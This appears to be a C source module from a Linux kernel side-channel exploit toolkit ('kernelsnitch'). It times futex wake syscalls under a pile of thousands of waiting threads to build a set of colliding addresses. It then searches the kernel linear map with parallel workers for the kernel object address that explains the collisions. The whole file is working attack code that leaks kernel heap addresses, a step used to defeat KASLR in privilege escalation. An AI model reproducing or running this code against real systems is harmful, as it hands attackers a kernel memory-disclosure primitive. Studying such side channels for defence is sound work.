/* Futex-hash timing: collect a colliding set, then search for the address that
 * explains it. */
#define _GNU_SOURCE

#include "futex_scan.h"

#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "futex_bucket.h"
#include "../base/bytes.h"
#include "../base/timing.h"

/* How many wakes are timed per candidate, and how many of the fastest are kept.
 * A wake is a syscall on a busy system, so the distribution has a long tail
 * that says nothing about the bucket; the low order statistic is the signal. */
#ifndef LIB_FUTEX_MEASUREMENTS
#define LIB_FUTEX_MEASUREMENTS 128
#endif
#ifndef LIB_FUTEX_LOW_SAMPLES
#define LIB_FUTEX_LOW_SAMPLES 8
#endif
/* Waiters parked on one address, so that a bucket sharing it is measurably
 * slower to wake than an empty one. */
#ifndef LIB_FUTEX_PILE_WAITERS
#define LIB_FUTEX_PILE_WAITERS 4096
#endif
/* How much slower than an empty bucket a wake must be to count as a collision.
 * Generous, because a false positive poisons the whole set while a false
 * negative only costs another candidate. */
#ifndef LIB_FUTEX_THRESHOLD_MULTIPLIER
#define LIB_FUTEX_THRESHOLD_MULTIPLIER 10
#endif

struct pile_arg {
	struct kernelsnitch_state *shared;
	uint32_t *word;
};

struct scan_arg {
	struct kernelsnitch_state *shared;
	const struct lib_futex_scan_cfg *cfg;
	uint64_t begin;
	uint64_t end;
	int index;
};

/* Time a wake on a word nobody is waiting on. The kernel still takes the
 * bucket's lock, which is the whole measurement. */
static uint64_t fs_measure_empty_wake(uint32_t *word)
{
	uint64_t samples[LIB_FUTEX_MEASUREMENTS];
	uint64_t total = 0;

	for (int i = 0; i < LIB_FUTEX_MEASUREMENTS; i++) {
		uint64_t begin;

		sched_yield();
		begin = (uint64_t)rdtsc_begin();
		syscall(SYS_futex, word, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
		samples[i] = (uint64_t)rdtsc_begin() - begin;
	}
	qsort(samples, LIB_FUTEX_MEASUREMENTS, sizeof(samples[0]), lib_cmp_u64);
	for (int i = 0; i < LIB_FUTEX_LOW_SAMPLES; i++)
		total += samples[i];
	return total / LIB_FUTEX_LOW_SAMPLES;
}

static void *fs_pile_waiter(void *opaque)
{
	struct pile_arg *arg = opaque;
	struct kernelsnitch_state *shared = arg->shared;
	uint32_t *word = arg->word;

	free(arg);
	atomic_fetch_add_explicit(&shared->pile_started, 1, memory_order_release);
	syscall(SYS_futex, word, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
	return NULL;
}

int lib_futex_collisions_build(struct kernelsnitch_state *shared,
                               unsigned char *futex_map)
{
	pthread_attr_t attributes;
	uint32_t *pile_word = (uint32_t *)((unsigned char *)shared + 512);
	uint32_t found = 1;
	int created = 0;
	uint64_t baseline_a, baseline_b, threshold, candidate_count;

	if (!shared || !futex_map || !shared->hash_size)
		return -1;

	/* The pile's own address is the first member of the set: every other
	 * candidate is accepted for colliding with it. */
	shared->collision_addresses[0] = (uint64_t)(uintptr_t)pile_word;
	if (pthread_attr_init(&attributes))
		return -1;
	pthread_attr_setstacksize(&attributes, 64 * 1024);
	for (int i = 0; i < LIB_FUTEX_PILE_WAITERS; i++) {
		struct pile_arg *arg = calloc(1, sizeof(*arg));
		pthread_t thread;

		if (!arg)
			break;
		arg->shared = shared;
		arg->word = pile_word;
		if (pthread_create(&thread, &attributes, fs_pile_waiter, arg)) {
			free(arg);
			break;
		}
		pthread_detach(thread);
		created++;
	}
	pthread_attr_destroy(&attributes);
	for (int i = 0; i < 5000; i++) {
		if (atomic_load_explicit(&shared->pile_started, memory_order_acquire) == created)
			break;
		usleep(1000);
	}
	usleep(100000);
	if (created < LIB_FUTEX_PILE_WAITERS * 3 / 4) {
		printf("KS_PILE_FAIL created=%d started=%d\n", created,
		       atomic_load_explicit(&shared->pile_started, memory_order_relaxed));
		return -1;
	}

	/* Two baselines, from buckets the pile is not in, so a machine-wide
	 * slowdown raises the threshold with them instead of being read as a
	 * collision. The lower is used, which is the conservative choice. */
	baseline_a = fs_measure_empty_wake((uint32_t *)(futex_map + 0x1000));
	baseline_b = fs_measure_empty_wake((uint32_t *)(futex_map + 2 * 0x1000 + 8));
	threshold = (baseline_a < baseline_b ? baseline_a : baseline_b) *
		    LIB_FUTEX_THRESHOLD_MULTIPLIER;
	candidate_count = (uint64_t)shared->hash_size * LIB_FUTEX_COLLISION_GOAL * 4;
	for (uint64_t i = 2; i < candidate_count && found < LIB_FUTEX_COLLISION_GOAL; i++) {
		uint64_t index = i * 0x1000 + (i * 8 & (0x1000 - 1));
		uint32_t *candidate = (uint32_t *)(futex_map + index);

		if (fs_measure_empty_wake(candidate) > threshold)
			shared->collision_addresses[found++] = (uint64_t)(uintptr_t)candidate;
	}
	shared->collision_count = found;
	atomic_store_explicit(&shared->collisions_ready, 1, memory_order_release);
	printf("KS_COLLISIONS pile=%d baseline=%llu/%llu threshold=%llu found=%u/%u\n",
	       created, (unsigned long long)baseline_a, (unsigned long long)baseline_b,
	       (unsigned long long)threshold, found, LIB_FUTEX_COLLISION_GOAL);
	return found == LIB_FUTEX_COLLISION_GOAL ? 0 : -1;
}

/* Walk one range of the linear map, testing each candidate object address
 * against the model. Only the true address puts every member of the set in one
 * bucket; the first worker to find it claims the result. */
static void *fs_scan_range(void *opaque)
{
	struct scan_arg *arg = opaque;
	struct kernelsnitch_state *shared = arg->shared;
	const struct lib_futex_scan_cfg *cfg = arg->cfg;

	for (uint64_t slab = arg->begin; slab < arg->end; slab += cfg->slab_bytes) {
		if (atomic_load_explicit(&shared->found, memory_order_acquire))
			break;
		for (uint64_t address = slab;
		     address + cfg->object_size <= slab + cfg->slab_bytes;
		     address += cfg->object_size) {
			int matches = 1;
			uint32_t bucket = lib_futex_bucket(shared->collision_addresses[0],
							   address, shared->hash_size);

			for (uint32_t i = 1; i < shared->collision_count; i++) {
				if (lib_futex_bucket(shared->collision_addresses[i], address,
						     shared->hash_size) != bucket) {
					matches = 0;
					break;
				}
			}
			if (matches) {
				if (!atomic_exchange_explicit(&shared->found, 1,
							      memory_order_acq_rel))
					shared->mm_address = address;
				break;
			}
		}
	}
	printf("KS_SCAN_DONE worker=%d found=%d\n", arg->index,
	       atomic_load_explicit(&shared->found, memory_order_relaxed));
	return NULL;
}

uint64_t lib_futex_scan_object(struct kernelsnitch_state *shared, int workers,
                               const struct lib_futex_scan_cfg *cfg)
{
	pthread_t *threads;
	struct scan_arg *arguments;
	uint64_t range;

	if (!shared || !cfg || workers < 1 || !cfg->object_size || !cfg->slab_bytes ||
	    cfg->map_end <= cfg->map_begin)
		return 0;
	threads = calloc((size_t)workers, sizeof(*threads));
	arguments = calloc((size_t)workers, sizeof(*arguments));
	if (!threads || !arguments) {
		free(threads);
		free(arguments);
		return 0;
	}
	range = (cfg->map_end - cfg->map_begin) / (uint64_t)workers;
	for (int i = 0; i < workers; i++) {
		arguments[i].shared = shared;
		arguments[i].cfg = cfg;
		arguments[i].begin = cfg->map_begin + range * (uint64_t)i;
		arguments[i].end = i == workers - 1
					   ? cfg->map_end
					   : cfg->map_begin + range * (uint64_t)(i + 1);
		/* Ranges start on a coarse boundary so a slab is never split
		 * across two workers and missed by both. */
		if (cfg->coarse_bytes) {
			arguments[i].begin &= ~(cfg->coarse_bytes - 1);
			arguments[i].end = (arguments[i].end + cfg->coarse_bytes - 1) &
					   ~(cfg->coarse_bytes - 1);
		}
		arguments[i].index = i;
		if (pthread_create(&threads[i], NULL, fs_scan_range, &arguments[i])) {
			/* A worker that never started leaves its range unsearched,
			 * so the answer would be "not found" for a reason that is
			 * not about the target. */
			for (int j = 0; j < i; j++)
				pthread_join(threads[j], NULL);
			free(threads);
			free(arguments);
			return 0;
		}
	}
	for (int i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);
	{
		uint64_t address = atomic_load_explicit(&shared->found, memory_order_acquire)
					   ? shared->mm_address
					   : 0;

		free(threads);
		free(arguments);
		return address;
	}
}
